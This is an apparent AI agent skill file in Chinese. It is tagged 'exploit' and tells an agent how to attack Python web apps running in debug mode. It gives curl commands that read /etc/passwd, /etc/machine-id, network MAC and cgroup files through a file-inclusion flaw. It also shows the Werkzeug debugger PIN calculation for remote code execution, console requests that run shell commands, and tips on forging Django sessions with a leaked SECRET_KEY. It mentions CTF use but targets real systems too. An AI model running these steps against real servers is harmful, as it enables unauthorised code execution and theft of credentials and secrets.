---
name: python-web-debug
description: "Python Web 框架 Debug 模式利用。当目标是 Flask/Django/FastAPI/Tornado 应用且开启了 Debug 模式时使用。当看到 Werkzeug Debugger 页面（交互式 Python console）、Django 黄色调试页面（Settings/Traceback）、FastAPI 自动文档(/docs /redoc)、或错误页面泄露了 Python 堆栈跟踪和源码路径时使用。Werkzeug debugger PIN 计算是 CTF 和实战中的经典考点——通过读取 /etc/machine-id 和 MAC 地址即可算出 PIN 码获取 RCE。任何 Python Web 应用的错误页面、/console 路径、或泄露了 Flask/Django/Werkzeug 版本信息时都应使用此 skill"
metadata:
  tags: "python,flask,django,fastapi,werkzeug,debug,console,PIN,debugger,RCE,信息泄露,调试模式"
  category: "exploit"
---

# Python Web Debug 模式利用

Python Web 框架的 Debug 模式是开发者留下的最危险的配置错误之一——Werkzeug debugger 直接提供交互式 Python shell（RCE），Django DEBUG=True 泄露完整配置和源码路径，FastAPI /docs 暴露所有 API 接口。

## Phase 0: 快速识别

| 信号 | 框架 | 危害等级 |
|------|------|----------|
| `/console` 路径可访问 | Flask/Werkzeug | 🔴 RCE（需 PIN） |
| 错误页面显示 Werkzeug Debugger | Flask | 🔴 RCE |
| 黄色错误页面 + `Settings` + `Traceback` | Django | 🟠 信息泄露 |
| `/docs` 或 `/redoc` 可访问 | FastAPI | 🟡 API 暴露 |
| 错误页面含 Python traceback + 源码路径 | 任意 | 🟡 信息泄露 |
| `X-Powered-By: Werkzeug` 或 `Server: Werkzeug` | Flask | 识别框架 |
| 404 页面含 `Not Found. The requested URL was not found` | Flask 默认 | 识别框架 |

## Phase 1: Werkzeug Debugger RCE（最高优先级）

Werkzeug debugger 在 Debug 模式下提供交互式 Python console，但自 Werkzeug 0.11+ 起需要 PIN 码验证。

### 1.1 检查 /console 是否可访问

```bash
curl -s http://TARGET/console
# 如果返回 HTML 中包含 "Werkzeug Debugger" → 可利用
# 如果需要 PIN → 继续 PIN 计算
```

### 1.2 PIN 计算

PIN 由以下 6 个值生成（Werkzeug 源码中的 `get_pin_and_cookie_name` 函数）：

| # | 变量 | 获取方式 |
|---|------|----------|
| 1 | `username` | 运行 Flask 的用户名 → `/etc/passwd` 或错误页面泄露 |
| 2 | `modname` | 通常是 `flask.app` |
| 3 | `getattr(app, '__name__', type(app).__name__)` | 通常是 `Flask` |
| 4 | `getattr(mod, '__file__', None)` | Flask 的 `app.py` 路径 → 错误页面泄露 |
| 5 | `uuid.getnode()` | 网卡 MAC 地址 → `/sys/class/net/eth0/address` |
| 6 | `get_machine_id()` | `/etc/machine-id` 或 `/proc/sys/kernel/random/boot_id`（取第一个可用值）+ `/proc/self/cgroup` 片段 |

**完整 PIN 计算算法** → 读 [references/werkzeug-pin-calculation.md](references/werkzeug-pin-calculation.md)

### 1.3 读取必要文件

通常需要通过 LFI/SSRF/错误信息泄露来读取：

```bash
# MAC 地址（去掉冒号，转为十进制）
curl http://TARGET/vuln?file=/sys/class/net/eth0/address
# 02:42:ac:11:00:02 → 0x0242ac110002 → 2485377892354

# machine-id
curl http://TARGET/vuln?file=/etc/machine-id
# 如果不存在，用 boot_id:
curl http://TARGET/vuln?file=/proc/sys/kernel/random/boot_id

# cgroup（Docker 环境中需要）
curl http://TARGET/vuln?file=/proc/self/cgroup
# 取第一行最后一个 / 后的内容（容器 ID）

# 运行用户
curl http://TARGET/vuln?file=/etc/passwd
# 或从错误页面的 traceback 中提取路径 /home/USERNAME/...
```

### 1.4 PIN 获取后利用

```bash
# 1. 访问 /console，输入 PIN
# 2. 在 Python console 中执行命令：
import os; os.popen('id').read()
import os; os.popen('cat /flag*').read()

# 3. 或通过 API 调用（不需要浏览器）：
# 先获取 PIN cookie
curl 'http://TARGET/console?__debugger__=yes&cmd=pinauth&pin=PIN_CODE&s=SECRET'
# SECRET 从 /console 页面的 HTML 中提取

# 然后执行命令
curl 'http://TARGET/console?__debugger__=yes&cmd=__import__("os").popen("id").read()&frm=0&s=SECRET' \
  -H 'Cookie: __wzd..=PIN_COOKIE'
```

> Werkzeug 2.1+ 使用 SHA-1 算法生成 PIN（之前用 MD5），计算脚本需要区分版本。

## Phase 2: Django DEBUG=True 信息泄露

### 2.1 触发调试页面

```bash
# 访问不存在的 URL → Django 会显示所有 URL 配置
curl http://TARGET/nonexistent_path_12345/

# 触发错误 → 显示完整 traceback + 源码 + settings
curl http://TARGET/api/test?id='
```

### 2.2 敏感信息提取

Django 调试页面泄露：
- **Settings**: `SECRET_KEY`、数据库配置、AWS 凭据、邮件服务器
- **URL 配置**: 所有路由包括 admin 后台路径
- **Traceback**: 源码片段、文件路径、本地变量值
- **Request 信息**: Cookie、Session 数据

```
关键搜索：
SECRET_KEY → 可伪造 session/CSRF token
DATABASE → 数据库连接信息
AWS_ACCESS_KEY → 云凭据
ALLOWED_HOSTS → 子域名信息
```

### 2.3 Django SECRET_KEY 利用

拿到 SECRET_KEY 后：

```python
# 伪造 Django 签名数据 / session
# Django 默认使用 JSONSerializer；只有显式配置 PickleSerializer 的旧应用才存在 pickle 反序列化 RCE 风险
import django.core.signing
# 默认 JSON session 场景主要关注签名数据伪造；PickleSerializer 场景再参考 deserialization-methodology skill

# 伪造密码重置 Token
from django.contrib.auth.tokens import PasswordResetTokenGenerator
```

## Phase 3: FastAPI /docs 暴露

### 3.1 检测

```bash
curl -s http://TARGET/docs     # Swagger UI
curl -s http://TARGET/redoc    # ReDoc
curl -s http://TARGET/openapi.json  # OpenAPI schema（最有价值）
```

### 3.2 利用

`/openapi.json` 包含所有 API 端点的完整定义——路径、方法、参数、响应格式：

```bash
# 下载完整 API 定义
curl -s http://TARGET/openapi.json | python3 -m json.tool

# 提取所有端点
curl -s http://TARGET/openapi.json | jq '.paths | keys[]'

# 重点关注：
# - /admin/ 路径下的管理接口
# - 含 delete/update/create 的端点
# - 含 user/role/permission 的端点
# - 含 file/upload/download 的端点
```

## Phase 4: Tornado/Bottle/其他框架

### Tornado Debug 模式

```bash
# Tornado debug=True 时，错误页面显示完整 traceback
# 但不像 Werkzeug 那样提供交互式 console
# 关注：源码路径、配置信息、cookie_secret 泄露
```

### 通用 Python 错误信息利用

任何 Python Web 框架在 Debug 模式下的错误页面都可能泄露：
- 文件系统路径 → 确定安装位置和用户
- 环境变量 → 可能包含密钥、凭据
- 依赖版本 → 查找已知 CVE
- 数据库连接字符串 → 直连数据库

## 决策树

```
发现 Python Web 应用
├── /console 可访问 → Werkzeug Debugger → PIN 计算 → RCE
├── 错误页面是 Django 黄色调试页 → 提取 SECRET_KEY → Session 伪造
├── /docs 或 /redoc 可访问 → FastAPI → API 枚举
├── 错误页面含 Python traceback → 信息收集（路径/用户/版本）
└── 以上都不是 → 主动触发错误（特殊字符/类型错误/长输入）
```

## 参考资源

- Werkzeug PIN 计算完整算法（含 Python 3.x 和 Docker 差异）→ [references/werkzeug-pin-calculation.md](references/werkzeug-pin-calculation.md)
